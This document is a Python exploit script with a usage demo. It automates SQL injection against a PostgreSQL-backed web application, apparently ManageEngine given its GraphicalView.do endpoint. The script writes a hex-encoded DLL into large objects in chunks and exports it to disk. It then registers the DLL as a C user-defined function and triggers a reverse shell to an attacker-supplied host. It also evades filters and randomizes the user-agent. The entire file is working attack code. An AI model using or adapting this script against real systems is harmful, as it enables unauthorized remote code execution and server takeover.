# DEMONSTRATION:
# $ python3 sqli_pgsql_udf_lo_hex.py method,haid get popUp 192.168.252.14 6969 rev_shell.dll hodor_revshell "1;" ";--" https://192.168.252.15:8443/GraphicalView.do
# [?] Select a parameter to test for injection:: haid
#    method
#  > haid
# 
# [*] Creating LO for UDF injection...
# [*] Injecting hex encoded payload of length 16384 into LO...
# [*] Injecting 5 times of chunklength of 4096...
# [*] Exporting UDF library to filesystem...
# [*] Creating function...
# [*] Launching reverse shell via UDF...
# [*] Deleting existing LO...

#!/usr/bin/python3
import requests
import urllib3
import os
import sys
import re
import inquirer
import base64
import random
import string
from random_useragent.random_useragent import Randomize     # Randomize useragent

# Optionally, use a proxy
# proxy = "http://<user>:<pass>@<proxy>:<port>"
proxy = "http://localhost:8080"
os.environ['http_proxy'] = proxy
os.environ['HTTP_PROXY'] = proxy
os.environ['https_proxy'] = proxy
os.environ['HTTPS_PROXY'] = proxy

# Disable cert warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Variables
loid = random.randint(1000,9999)
encoding = "hex"
chunk = 4096
timeout = 10

# Handle CTRL-C
def keyboard_interrupt():
    """Handles keyboardinterrupt exceptions"""
    print("\n\n[*] User requested an interrupt, exiting...")
    exit(1)

# Randomize user-agent
def http_headers():
    # Randomize useragent
    useragent = Randomize().random_agent('desktop', 'windows')
    # HTTP Headers. Might need modification for each webapplication
    headers = {
        'User-Agent': useragent,
    }
    return headers

def random_str(str_len):
    letters = string.ascii_letters
    return ''.join(random.choice(letters) for i in range(str_len))

def encode_payload(raw_payload):
    # Read payload from file and base64 encode
    with open(raw_payload, 'rb') as f:
        if encoding == 'base64':
            b64_bytes = base64.b64encode(f.read())
            payload = b64_bytes.decode('utf-8')
        elif encoding == 'hex':
            payload = f.read().hex()
    return payload

def delete_lo(loid):
    print("[*] Deleting existing LO...")
    sql = "select lo_unlink(" + str(loid) + ")"
    return sql

def create_lo(loid):
    print("[*] Creating LO for UDF injection...")
    sql = "select lo_create(" + str(loid) + ")"
    return sql

def inject_udf(url,get_post,headers,def_val,inj_param,params,loid,payload,prefix,suffix):
    print("[*] Injecting " + encoding + " encoded payload of length " + str(len(payload)) + " into LO...")
    rounded = round(len(payload) / chunk) + 1           # +1 due to stupid Python 3 handling of rounding
    print("[*] Injecting " + str(rounded) + " times of chunklength of " + str(chunk) + "...")

    for i in range(0, int(rounded)):
        start_chunk = i * chunk
        end_chunk = start_chunk + chunk
        payload_chunk = payload[start_chunk:end_chunk]
        sql = "insert into pg_largeobject (loid,pageno,data) values (" + str(loid) + "," + str(i) + ",decode('" + payload_chunk + "','" + encoding + "'))"
        create_request(url,get_post,headers,def_val,inj_param,params,prefix,sql,suffix)

def export_udf(loid,write_path_file):
    print("[*] Exporting UDF library to filesystem...")
    sql = "select lo_export(" + str(loid) + ", '" + write_path_file + "')"
    return sql

def create_udf_func(dll_function,write_path_file):
    print("[*] Creating function...")
    sql = "create or replace function " + dll_function + "(text,integer) returns void as '" + write_path_file + "', 'connect_back' language c strict"
    return sql

def trigger_udf(revhost,revport,dll_function):
    print("[*] Launching reverse shell via UDF...")
    sql = "select " + dll_function + "('" + revhost + "', " + str(revport) + ")"
    return sql

def create_request(url,get_post,headers,def_val,inj_param,params,prefix,inj_str,suffix):
    # print("[*] Using injection string: " + prefix + inj_str + suffix)
    # Optionally modify injection string via regex for character evasion
    inj_regex_str = re.sub(" ","+",inj_str)                     # Replace space for +
    inj_regex_str = re.sub("'","$$",inj_regex_str)              # Replace single quote for $$
    # print("[*] Character evasion string: " + prefix + inj_regex_str + suffix)
    # Injection parameters
    inj_params = dict()
    for param in params:
        inj_params[param] = def_val
        if param == inj_param:
            inj_params[param] = prefix + inj_regex_str + suffix
    # Disable URL encoding characters
    params_str = "&".join("%s=%s" % (k,v) for k,v in inj_params.items())
    # Do requests
    if get_post.lower() == "get":
        r = requests.get(url,params=params_str,headers=headers,timeout=timeout,verify=False)
    elif get_post.lower() == "post":
        r = requests.post(url,data=params_str,headers=headers,timeout=timeout,verify=False)

# Main
def main(argv):
    if len(sys.argv) == 11:
        params = sys.argv[1].split(",")
        get_post = sys.argv[2]
        def_val = sys.argv[3]
        revhost = sys.argv[4]
        revport = sys.argv[5]
        payl = sys.argv[6]
        dll_function = sys.argv[7]
        prefix = sys.argv[8]
        suffix = sys.argv[9]
        url = sys.argv[10]
    else:
        print("[*] Usage: " + sys.argv[0] + " <param1,param2,..> <get_post> <default_val> <reverse_shell_host> <reverse_shell_port> <payload_file> <dll_function> <inj_prefix> <inj_suffix> <url>")
        print("[*] Example: " + sys.argv[0] + " method,haid get popUp 192.168.252.7 6969 rev_shell.dll hodor_revshell \"1;\" \";--\" https://192.168.252.14:8443/GraphicalView.do\n")
        exit(0)

    # User Agent
    headers = http_headers()

    # Path to write file
    random_fn = random_str(random.randint(8,16))
    write_path_file = "c:\\users\\public\\" + random_fn + ".dll"

    # Do stuff
    try:
        # Check to see if it is a file to read as an argument
        if os.path.isfile(payl):
            # File exists and keep going
            payload = encode_payload(payl)
        else:
            # Print error and bail, file not there
            print("[!] The following file does not exist: " + payl + "\n")
            exit(-1)

        # Select parameter
        param_question = [inquirer.List('params',
                message="Select a parameter to test for injection:",
                choices=params),]
        param_answer = inquirer.prompt(param_question)
        inj_param = param_answer["params"]

        # Create LO
        create_request(url,get_post,headers,def_val,inj_param,params,prefix,create_lo(loid),suffix)
        # Inject UDF
        inject_udf(url,get_post,headers,def_val,inj_param,params,loid,payload,prefix,suffix)
        # Export UDF
        create_request(url,get_post,headers,def_val,inj_param,params,prefix,export_udf(loid,write_path_file),suffix)
        # Create UDF
        create_request(url,get_post,headers,def_val,inj_param,params,prefix,create_udf_func(dll_function,write_path_file),suffix)
        # Trigger UDF
        create_request(url,get_post,headers,def_val,inj_param,params,prefix,trigger_udf(revhost,revport,dll_function),suffix)
        # Delete LO
        create_request(url,get_post,headers,def_val,inj_param,params,prefix,delete_lo(loid),suffix)

    except requests.exceptions.Timeout:
        print("[!] Timeout error\n")
    except requests.exceptions.TooManyRedirects:
        print("[!] Too many redirects\n")
        exit(-1)
    except requests.exceptions.ConnectionError:
        print("[!] Not able to connect to URL\n")
        exit(-1)
    except requests.exceptions.RequestException as e:
        print("[!] " + str(e))
        exit(-1)
    except requests.exceptions.HTTPError as e:
        print("[!] Failed with error code - " + e.code + "\n")
        exit(-1)
    except KeyboardInterrupt:
        keyboard_interrupt()

# If we were called as a program, go execute the main function.
if __name__ == "__main__":
    main(sys.argv[1:])

